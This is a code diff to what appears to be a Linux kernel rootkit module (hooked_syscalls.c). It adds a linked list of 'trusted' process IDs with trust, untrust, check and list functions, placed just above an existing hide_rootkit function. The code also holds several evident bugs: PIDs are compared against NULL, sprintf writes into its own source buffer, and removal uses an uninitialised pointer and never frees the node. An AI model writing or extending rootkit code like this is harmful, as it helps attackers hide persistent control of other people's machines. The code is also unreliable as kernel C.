@@ -6,6 +6,70 @@
 
 extern int BUFFER_SIZE;
 
+struct trusted_pid_node_t{
+	int pid;
+	struct trusted_pid_node_t *next;
+};
+struct trusted_pid_node_t trusted_pid_head = {.pid=NULL, .next=NULL};
+
+
+
+static int trust_pid(int pid){
+	struct trusted_pid_node_t *current = &trusted_pid_head;
+	if (current->pid==NULL){
+		current->pid = pid;
+		return 0;
+	}
+	while (current->next != NULL) {
+  	current = current->next;
+  }
+	current->next = (struct trusted_pid_node_t *) kmalloc(sizeof(trusted_pid_node_t), GFP_KERNEL);
+  current->next->pid = pid;
+  current->next->next = NULL;
+	return 0;
+}
+
+static int untrust_pid(int pid){
+	struct trusted_pid_node_t *current = &trusted_pid_head;
+	if (current->pid==pid){
+		current->pid=NULL;
+		return 0;
+	}
+	struct trusted_pid_node_t *previous;
+	while(current!=NULL){
+		if (current->pid==pid){
+			previous->next = current->next;
+			return 0;
+		}
+		previous = current;
+		current = current->next;
+	}
+	return 0;
+}
+
+static bool check_pid_trusted(int pid){
+	struct trusted_pid_node_t *current = &trusted_pid_head;
+	while(current!=NULL){
+		if (current->pid==pid){
+			return true;
+		}
+		current = current->next;
+	}
+	return false;
+}
+
+static int list_trusted_pids(void){
+	struct trusted_pid_node_t *current = &trusted_pid_head;
+	char buffer[BUFFER_SIZE];
+	sprintf(buffer, "[hooked_syscalls.c::list_trusted_pids] trusted pids: ");
+	while (current != NULL) {
+		sprintf(buffer, "%s %i", buffer, current->pid);
+  	current = current->next;
+  }
+	log_msg(buffer);
+	return 0;
+}
+
 
 
 static int hide_rootkit(bool hide){
